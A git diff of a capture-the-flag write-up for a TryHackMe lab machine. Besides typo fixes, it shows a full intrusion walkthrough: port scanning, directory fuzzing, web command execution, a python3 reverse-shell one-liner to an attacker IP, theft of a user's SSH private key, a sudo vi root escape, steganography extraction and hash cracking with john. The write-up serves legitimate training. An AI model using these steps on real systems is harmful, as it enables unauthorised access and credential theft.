@@ -11,7 +11,7 @@ nmap -sT -sV 10.10.198.134
 ```
 ![nmap](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/005c2016-e177-4bdd-99fd-482577aae1cf)
 
-as it shows there are pleny of ports open like `21` , `22`, `80` and other ports.
+as it shows there are plenty of ports open like `21` , `22`, `80` and other ports.
 
 on port 80 you can see there is a login page :
 
@@ -19,7 +19,8 @@ on port 80 you can see there is a login page :
 
 but we don't have any credentials, and **SQLi** attack does not work here.
 
-let's fuzz the website with `ffuf` :
+let's FUZZ the website with `ffuf` :
+
 ```bash
 ffuf -w ~/wordlist/raft-medium-files.txt  -u http://10.10.198.134/FUZZ -fc 403
 ```
@@ -28,7 +29,7 @@ ffuf -w ~/wordlist/raft-medium-files.txt  -u http://10.10.198.134/FUZZ -fc 403
 
 yes , we have found 2 new directory : `home.php` and `validate.php`
 
-navigate to `home.php` and there is a input box which you can type a command :
+navigate to `home.php` and there is an input box which you can type a command :
 
 ![home](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/46db25de-4d09-4703-8c44-3e267a9fc820)
 
@@ -36,6 +37,7 @@ use `ls` command to see the contents of the current directory :
 ```
  home.jpg home.php image.png index.html index.php.bak key_rev_key validate.php 
 ```
+
 download `key_rev_key` file and see the `strings` of it :
 
 ```bash
@@ -76,7 +78,9 @@ export RHOST="10.18.57.234";export RPORT=4444;python3 -c 'import sys,socket,os,p
 ```
 
 we gain the shell as `www-data` 
+
 navigate to `/home/charlie` , here we don't have access to `user.txt` but we can read the content of `teleport` which is charlie private key and `teleport.pub`
+
 save the content of teleport file and ssh to machine with this private key
 
 ```bash
@@ -84,9 +88,11 @@ ssh -i charlie.key charlie@10.10.198.134
 ```
 
 now we are user charlie and can cat the content of user.txt and find the first flag:
+
 ```bash
 cat user.txt
 ```
+
 ## Privilege Escalation
 
 let's see if we can escalate our privileges, i use `sudo -l` to see any sudo permissions that user charlie has :
@@ -97,12 +103,13 @@ sudo -l
 
 ![sudo](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/0b659a79-d057-4df8-b2c6-4418390e1040)
 
-we can run `/usr/bin/vi` as sudo, then do it and then open another shell within vi and become root
+we can run `/usr/bin/vi` as sudo, then do it and open another shell within vi and become root :
+
 ```bash
 :!/bin/bash
 ```
 
-navigate to `/root` we see `root.py`, we need to execute it with python not python3
+navigate to `/root` we see `root.py`, we need to execute it with `python` not python3 :
 
 ```python
 python root.py
@@ -127,10 +134,13 @@ ftp 10.10.198.134
 ![ftp](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/01c16df5-2a33-4e7b-b872-22228a3746e1)
 
 download the image with `get gum_room.jpg` and look to see if any data is embedded inside it :
+
 ```bash
 steghide info gum_room.jpg
 ```
+
 it needs a password to show the info, just use a blank password and you see a b64.txt file is embedded inside
+
 decode it :
 
 ```bash
@@ -139,4 +149,11 @@ cat b64.txt | base64 -d
 
 ![b64](https://github.com/Git-K3rnel/TryHackMe/assets/127470407/fe129af1-ef4a-4083-aa20-477e02c4bae5)
 
-we need to crack the charlie hashed password, save the last
+we need to crack the charlie hashed password, save the last line in a text file and use `john` to crack it :
+
+```bash
+john hash.txt --wordlist=/usr/share/wordlist/rouckyou.txt
+```
+it must get you the password within 5 to 10 minutes.
+
+This is how you solve this challenge.
